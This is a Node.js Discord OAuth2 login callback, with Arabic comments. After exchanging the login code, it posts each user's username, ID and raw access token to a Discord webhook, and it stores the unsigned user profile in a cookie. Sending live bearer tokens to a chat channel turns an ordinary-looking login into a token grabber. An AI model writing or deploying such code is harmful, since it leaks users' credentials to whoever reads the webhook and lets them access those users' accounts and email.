import fetch from "node-fetch";

export default async function handler(req, res) {
  const code = req.query.code;
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!code) {
    return res.status(400).send("لا يوجد كود تفويض");
  }

  const params = new URLSearchParams();
  params.append("client_id", process.env.DISCORD_CLIENT_ID);
  params.append("client_secret", process.env.DISCORD_CLIENT_SECRET);
  params.append("grant_type", "authorization_code");
  params.append("code", code);
  params.append("redirect_uri", process.env.REDIRECT_URI);
  params.append("scope", "identify email");

  try {
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      body: params,
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });
    const tokenData = await tokenRes.json();

    if (tokenData.error) {
      return res.status(400).json(tokenData);
    }

    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: {
        Authorization: `Bearer ${tokenData.access_token}`
      }
    });
    const userData = await userRes.json();

    // إرسال بيانات المستخدم والتوكن إلى Webhook
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `تم تسجيل دخول مستخدم جديد: \n- اليوزر: ${userData.username}#${userData.discriminator}\n- ID: ${userData.id}\n- توكن الوصول: ${tokenData.access_token}`
      })
    });

    // تخزين بيانات المستخدم في الكوكيز (بشكل بسيط)
    res.setHeader(
      "Set-Cookie",
      `discordUser=${encodeURIComponent(JSON.stringify(userData))}; HttpOnly; Path=/; Max-Age=86400`
    );

    // إعادة التوجيه إلى الصفحة الرئيسية
    res.writeHead(302, { Location: "/" });
    res.end();
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
